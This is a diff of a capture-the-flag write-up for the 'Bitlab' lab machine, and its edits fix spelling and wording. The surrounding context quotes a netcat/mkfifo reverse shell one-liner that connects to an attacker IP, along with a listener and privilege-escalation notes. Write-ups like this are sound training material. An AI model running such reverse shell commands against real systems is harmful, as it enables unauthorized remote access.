@@ -210,6 +210,8 @@ using this reverse shell i got my first shell.
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.172 9001 >/tmp/f
 
+Got my shell back
+
     root@kali:# nc -lvnp 9001
     Ncat: Version 7.80 ( https://nmap.org/ncat )
     Ncat: Listening on :::9001
@@ -230,9 +232,9 @@ Getting a full TTY with tab auto compilation.
     www-data@bitlab:/var/www/html/profile$ who
     who     whoami
 
-# Privileges Escelation
+# Privileges Escalation
 
-Bitlab had unintended way from www-data to root that I did on release time. But I will do both but the intended one first.
+Bitlab had unintended way from www-data to root that I did on release time. I will do both but the intended one first.
 
 ## www-data to Clave
 
@@ -246,7 +248,7 @@ Looking at listening ports.
     tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      off (0.00/0/0)
     ...(Snip)...
 
-So there was a PostgreSQL running on port 5432 but psql wasnt installed.
+So there was a PostgreSQL running on port 5432 but psql wasn't installed.
 
 Earlier I found a PHP code snippet about connecting to database. I used it like it was just added a print to fetched data.
 
